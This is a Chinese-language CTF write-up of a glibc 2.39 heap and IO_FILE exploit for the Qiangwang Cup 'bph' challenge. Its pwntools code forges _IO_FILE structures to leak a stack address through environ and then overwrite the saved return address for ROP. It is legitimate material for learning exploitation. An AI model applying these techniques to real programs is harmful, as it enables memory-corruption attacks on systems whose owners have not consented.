---
title: web选手入门pwn(31.5) 强网杯bph stack-leak 变种
contest: 强网杯
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags: [glibc-2.39, _IO_FILE, _IO_write_base-leak, environ, stack-read, House-of-Apple]
attack_chain: send A*0x28 泄 libc/choice=1 写一字节 0x00 到 stdin->_IO_buf_base 切断输入/伪造 stdin buf 指向 stdout+0x200 区可任意写 fake_stdout/伪造 fake_read_file: _IO_write_base=environ, _IO_write_ptr=environ+8, vtable=_IO_file_jumps 触发 puts 打印 environ → 泄 stack_N/再次伪造 fake_write_file: _IO_buf_base=stack_N, vtable=_IO_wfile_jumps 触发 gets 写栈上/栈上布置 ROP
key_payload: fake_file_write = flat({0x00: 0x800|0x1000, 0x20: environ, 0x28: environ+8, 0x70: 1, 0x68: stdin, 0xd8: _IO_file_jumps}, filler=b"\x00")
one_liner: 强网杯 bph 变种，通过 _IO_write_base/_IO_write_ptr 范围读 environ 泄栈，再用 _IO_buf_base 改写栈。
lesson: 伪造 _IO_FILE 的 `_IO_write_base/_IO_write_ptr` 范围可触发 `puts` 读任意地址；`environ` 符号永远指向 __libc_start_main 栈帧，是稳定的栈地址锚点；同一 fake_file 多次重用，每次根据 vtable 切换触发不同 IO 操作。
quality: high
---

# web选手入门pwn(31.5) 强网杯 bph stack-leak 变种

## 与 (31) 的差异
- 同样基于 IO_FILE 攻击，但额外利用 `_IO_write_base/_IO_write_ptr` 触发 `puts` 读 `environ` 符号
- 拿到栈地址后再用第二个 fake_file 触发 `gets` 写栈

## 利用步骤

### Stage 1: 泄 libc（同 (31)）
- `A*0x28` 触发 printf 残留 → 解析 `libc_N` → 算 `libc_base = libc_N - 0xadd9e`

### Stage 2: 改 stdin buf
```python
sh.sendlineafter("Choice:", "1")
sh.sendlineafter("Size:", str(stdin+56+1))
sh.sendlineafter("Content:", "")
sh.recvuntil("bad choice")
sh.sendafter("Choice:", p64(0x0)*3 + p64(stdout) + p64(stdout+0x200))
```

### Stage 3: 伪造 fake_read_file 泄栈
```python
file_read = IO_FILE_plus_struct()
file_read.flags = 0x1800
file_read._IO_write_base = environ      # puts 读起点
file_read._IO_write_ptr = environ + 0x8 # puts 读终点
file_read.fileno = 1
file_read.chain = stdin                 # 走完继续回到 stdin
file_read._lock = stdout + 0x300
file_read._wide_data = wide_data
file_read.vtable = file_jumps           # 触发 puts

sh.sendafter("Choice:", bytes(file_read))
stack_N = u64(sh.recvuntil("\x7f")[-6:] + b"\x00\x00")
print("stack_N: " + hex(stack_N))  # 0x7fffffffe3f8
```

### Stage 4: 伪造 fake_write_file 写栈
```python
file_write = IO_FILE_plus_struct()
file_write.flags = 0
file_write._IO_buf_base = stack_N        # gets 写起点
file_write._IO_buf_end = stack_N + 0x100
file_write.fileno = 0
file_write._lock = stdout + 0x300
file_write._codecvt = file_jumps - 0x48  # _wide_vtable → _IO_new_file_underflow
file_write._wide_data = stdout - 0x48
file_write.vtable = wfile_jumps

sh.sendafter("Choice:", bytes(file_write))
# 此时再输入的 gets 数据写到 stack_N 区域，覆盖 saved RIP
```

## 关键字段定义
- `_IO_FILE_plus_struct` 是 pwncli 提供的预定义结构体
- `_IO_write_base = 0x20`、`_IO_write_ptr = 0x28`、`_fileno = 0x70`、`_chain = 0x68`、`vtable = 0xd8`
- 触发条件：`_IO_read_end - _IO_read_ptr == 0` 时走 `_IO_new_file_underflow`

## 经验提炼
- 同一 fake_file 通过不同 vtable 切换 (`file_jumps` vs `wfile_jumps`) 触发不同 IO 操作
- `environ` 是稳定的栈地址锚点（指向 __libc_start_main 的栈帧）
- `_IO_write_base/_IO_write_ptr` 配合 `puts` 实现"读任意 8 字节"
- `_IO_buf_base/_IO_buf_end` 配合 `gets` 实现"写任意 N 字节"
- 多次 fake_file 操作可串联成"读 + 写"链，覆盖 __free_hook 移除后无法直接写函数指针的痛点
